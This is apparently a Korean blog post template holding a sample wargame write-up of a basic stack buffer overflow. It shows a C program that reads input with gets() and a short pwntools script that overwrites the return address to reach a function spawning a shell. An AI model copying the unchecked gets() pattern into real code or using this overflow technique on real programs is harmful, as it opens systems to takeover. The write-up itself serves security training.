---
layout: post
title: "[Wargame] basic_bof — return address 덮어쓰기"
categories: [ctf]
tags: [pwn, bof, wargame]
---

> 예시 write-up 입니다. 실제 문제 풀이로 교체하세요. 진행 중인 대회 문제는 대회 종료 후 공개!

## 문제 분석

```c
void win() { system("/bin/sh"); }

int main() {
    char buf[0x20];
    gets(buf);          // 길이 검사 없음 → BOF
    return 0;
}
```

- `checksec` 결과: **No canary**, **No PIE** → `win()` 주소 고정
- `buf` 는 `rbp-0x20`, 따라서 return address 까지 `0x20 + 8` 바이트

## 익스플로잇

```python
from pwn import *

p = process('./basic_bof')
e = ELF('./basic_bof')

payload  = b'A' * 0x28
payload += p64(e.symbols['win'])

p.sendline(payload)
p.interactive()
```

## 배운 점

- `gets()` 는 절대 쓰지 말 것 — `fgets(buf, sizeof buf, stdin)`
- 스택 정렬(movaps) 문제로 쉘이 안 뜨면 `ret` 가젯 하나를 앞에 끼워 넣기
